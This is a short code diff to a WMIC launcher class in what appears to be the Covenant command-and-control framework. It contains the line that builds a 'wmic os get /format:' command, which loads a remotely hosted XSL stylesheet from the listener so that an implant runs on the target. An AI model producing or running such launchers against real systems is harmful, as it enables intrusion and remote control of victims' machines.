@@ -18,8 +18,9 @@ namespace Covenant.Models.Launchers
             this.Description = "Uses wmic.exe to launch a Grunt using a COM activated Delegate and ActiveXObjects (ala DotNetToJScript). Please note that DotNetToJScript-based launchers may not work on Windows 10 and Windows Server 2016.";
             this.ScriptType = ScriptletType.Stylesheet;
             this.OutputKind = OutputKind.DynamicallyLinkedLibrary;
+            this.CompressStager = false;
         }
-        protected override String GetLauncher(string code)
+        protected override string GetLauncher()
         {
             string launcher = "wmic os get /format:\"" + "file.xsl" + "\"";
             this.LauncherString = launcher;
@@ -31,7 +32,7 @@ namespace Covenant.Models.Launchers
             HttpListener httpListener = (HttpListener)listener;
             if (httpListener != null)
             {
-				Uri hostedLocation = new Uri(httpListener.Url + hostedFile.Path);
+				Uri hostedLocation = new Uri(httpListener.Urls + hostedFile.Path);
                 string launcher = "wmic os get /format:\"" + hostedLocation + "\"";
                 this.LauncherString = launcher;
                 return launcher;
